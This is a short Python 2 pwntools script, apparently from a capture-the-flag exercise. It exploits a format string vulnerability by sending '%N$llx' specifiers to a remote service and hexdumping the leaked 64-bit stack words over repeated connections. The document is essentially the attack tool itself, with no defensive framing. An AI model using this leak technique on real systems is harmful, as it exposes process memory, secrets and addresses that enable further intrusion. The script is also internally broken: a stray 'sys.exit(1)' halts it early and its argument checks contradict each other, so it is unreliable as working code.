from pwn import *
import argparse, hexdump, re, sys, time

# Parameters:
# r: (remote) process
# u: read until string that preceeds the format string output
# n: number of 16 words to print
def get64(r, u, n):
    data = ''
    for i in range(1, n+1):
        r.sendline('0')
        r.sendline(r'%{}$llx'.format(i))
        r.recvuntil(u)
        x = r.recvline().zfill(17).replace('\n','')
        data += "".join([x[i:i+2] for i in range(0, len(x), 2)][::-1])
    return data

parser = argparse.ArgumentParser()
parser.add_argument('n', type=int, help='Number of repetitions')
parser.add_argument('w', type=int, help='Number of words to print')
parser.add_argument('t', type=float, help='Time to sleep between repetitions in seconds')
parser.add_argument('f', type=str, help='File containing the conversation until the format string vulnerability vector')
args = parser.parse_args()

print args.n

sys.exit(1)

context.log_level='error'
if len(sys.argv) != 3:
    print 'Usage: ./prog <number of repetitions> <number of words to print> <time to sleep between repetitions in seconds>'
    sys.exit(2)


H,P='localhost',6666
pre = ''
with open(args.f, 'r') as f:
    pre = f.read()

#H,P='pwnbox',1337
for i in range(args.n):
    r = remote(H,P)
    dump = get64(r, pre, args.w)
    hexdump.hexdump(dump.decode('hex'))
    time.sleep(args.t)
